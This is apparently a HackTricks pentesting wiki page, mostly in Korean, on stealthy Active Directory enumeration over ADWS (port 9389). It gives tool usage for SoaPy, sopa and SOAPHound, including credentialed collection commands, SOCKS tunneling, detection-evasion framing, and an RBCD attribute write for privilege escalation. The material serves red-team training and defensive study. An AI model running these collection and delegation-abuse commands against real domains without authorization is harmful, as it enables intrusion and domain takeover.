# Active Directory Web Services (ADWS) 열거 및 은밀 수집

{{#include ../../banners/hacktricks-training.md}}

## ADWS란?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2부터 모든 도메인 컨트롤러에서 기본적으로 활성화되어 있으며** TCP **9389**에서 대기합니다. 이름과 달리 **HTTP는 전혀 관여하지 않습니다**. 대신, 이 서비스는 LDAP 스타일의 데이터를 다음과 같은 독점적인 .NET 프레이밍 프로토콜 스택을 통해 노출합니다:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

이 트래픽이 이진 SOAP 프레임 안에 캡슐화되어 비표준 포트를 통해 전달되기 때문에, **ADWS를 통한 열거는 기존의 LDAP/389 & 636 트래픽보다 검사, 필터링 또는 시그니처화될 가능성이 훨씬 낮습니다**. 운영자에게 주는 이점은 다음과 같습니다:

* 더 은밀한 정찰 – Blue teams는 종종 LDAP 쿼리에 집중합니다.
* SOCKS 프록시로 9389/TCP를 터널링하면 **비-Windows 호스트(Linux, macOS)** 에서도 수집할 수 있습니다.
* LDAP을 통해 얻는 것과 동일한 데이터(사용자, 그룹, ACL, 스키마 등)와 함께 **쓰기** 작업 수행 능력(예: **RBCD**용 `msDs-AllowedToActOnBehalfOfOtherIdentity`).

ADWS 상호작용은 WS-Enumeration 위에서 구현됩니다: 모든 쿼리는 LDAP 필터/속성을 정의하고 `EnumerationContext` GUID를 반환하는 `Enumerate` 메시지로 시작하며, 그 뒤를 서버가 정의한 결과 창까지 스트리밍하는 하나 이상의 `Pull` 메시지가 따릅니다. Context는 약 30분 후에 만료되므로 도구는 결과를 페이징하거나 상태 손실을 피하기 위해 필터를 분할(예: CN별 접두사 쿼리)해야 합니다. 보안 서술자(security descriptors)를 요청할 때는 SACL을 생략하기 위해 `LDAP_SERVER_SD_FLAGS_OID` 컨트롤을 지정해야 합니다. 그렇지 않으면 ADWS는 SOAP 응답에서 `nTSecurityDescriptor` 속성을 단순히 제외합니다.

> NOTE: ADWS는 많은 RSAT GUI/PowerShell 도구에서도 사용되므로 트래픽이 합법적인 관리자 활동과 섞일 수 있습니다.

## SoaPy – 네이티브 Python 클라이언트

[SoaPy](https://github.com/logangoins/soapy) 는 **순수 Python으로 ADWS 프로토콜 스택을 완전히 재구현한 프로젝트**입니다. NBFX/NBFSE/NNS/NMF 프레임을 바이트 단위로 생성하므로 .NET 런타임을 건드리지 않고 Unix 계열 시스템에서 수집할 수 있습니다.

### 주요 기능

* SOCKS를 통한 프록시 지원( C2 implants에서 유용 ).
* LDAP의 `-q '(objectClass=user)'`와 동일한 세분화된 검색 필터.
* 선택적 **쓰기** 작업( `--set` / `--delete` ).
* BloodHound로 직접 입력 가능한 **BOFHound output mode**.
* 사람이 읽기 편할 때 타임스탬프와 `userAccountControl`을 정리해주는 `--parse` 플래그.

### 대상 수집 플래그 및 쓰기 작업

SoaPy는 ADWS 상에서 가장 일반적인 LDAP 헌팅 작업을 재현하는 엄선된 스위치를 제공합니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, 그리고 커스텀 풀을 위한 원시 `--query` / `--filter` 옵션. 이를 `--rbcd <source>`( `msDs-AllowedToActOnBehalfOfOtherIdentity` 설정), `--spn <service/cn>`(대상 Kerberoasting용 SPN 스테이징), `--asrep`( `userAccountControl`에서 DONT_REQ_PREAUTH 비트 토글) 같은 쓰기 프리미티브와 결합해서 사용하세요.

다음은 `samAccountName`과 `servicePrincipalName`만 반환하는 대상 SPN 탐색 예시:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
같은 호스트/자격증명을 사용해 발견 내용을 즉시 무기화하세요: `--rbcds`로 RBCD-capable 객체를 덤프한 뒤, `--rbcd 'WEBSRV01$' --account 'FILE01$'`를 적용해 Resource-Based Constrained Delegation 체인을 스테이징하세요 (전체 악용 경로는 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

### 설치 (운영자 호스트)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - A practical client for ADWS in Golang

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **객체 검색 및 조회** - `query` / `get`
* **객체 수명주기** - `create [user|computer|group|ou|container|custom]` and `delete`
* **속성 편집** - `attr [add|replace|delete]`
* **계정 관리** - `set-password` / `change-password`
* 그 외에도 `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` 등 다양한 명령이 있습니다.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is a .NET collector that keeps all LDAP interactions inside ADWS and emits BloodHound v4-compatible JSON. It builds a complete cache of `objectSid`, `objectGUID`, `distinguishedName` and `objectClass` once (`--buildcache`), then re-uses it for high-volume `--bhdump`, `--certdump` (ADCS), or `--dnsdump` (AD-integrated DNS) passes so only ~35 critical attributes ever leave the DC. AutoSplit (`--autosplit --threshold <N>`) automatically shards queries by CN prefix to stay under the 30-minute EnumerationContext timeout in large forests.

Typical workflow on a domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
내보낸 JSON은 SharpHound/BloodHound 워크플로우로 직접 삽입됩니다—다운스트림 그래프화 아이디어는 [BloodHound methodology](bloodhound.md)를 참조하세요. AutoSplit은 SOAPHound를 수백만 개 객체의 포리스트에서도 견고하게 유지하면서 쿼리 수를 ADExplorer-style 스냅샷보다 낮게 유지합니다.

## 스텔스 AD 수집 워크플로우

다음 워크플로우는 ADWS를 통해 **domain & ADCS objects**를 enumerate(열거)하고, 이를 BloodHound JSON으로 변환한 뒤 인증서 기반 공격 경로(certificate-based attack paths)를 탐색하는 방법을 보여줍니다 — 모두 Linux에서 수행됩니다:

1. **Tunnel 9389/TCP**를 대상 네트워크에서 자신의 시스템으로 터널링합니다(예: Chisel, Meterpreter, SSH dynamic port-forward 등). `export HTTPS_PROXY=socks5://127.0.0.1:1080`를 설정하거나 SoaPy의 `--proxyHost/--proxyPort`를 사용하세요.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC에서 ADCS 관련 객체를 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound으로 변환:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP 업로드** BloodHound GUI에서 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 같은 cypher 쿼리를 실행하여 인증서 승격 경로(ESC1, ESC8 등)를 확인합니다.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` 쓰기 (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
이것을 `s4u2proxy`/`Rubeus /getticket`와 결합하면 전체 **Resource-Based Constrained Delegation** 체인을 완성할 수 있습니다 (참조: [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## 도구 요약

| 목적 | 도구 | 설명 |
|---------|------|-------|
| ADWS 열거 | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, 읽기/쓰기 |
| 대량 ADWS 덤프 | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, 캐시 우선, BH/ADCS/DNS 모드 |
| BloodHound 수집 | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch 로그를 변환 |
| 인증서 탈취 | [Certipy](https://github.com/ly4k/Certipy) | 같은 SOCKS를 통해 프록시 가능 |
| ADWS 열거 및 객체 변경 | [sopa](https://github.com/Macmod/sopa) | 알려진 ADWS 엔드포인트와 상호작용하기 위한 일반 클라이언트 - 열거, 객체 생성, 속성 수정 및 암호 변경을 허용 |

## 참고자료

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
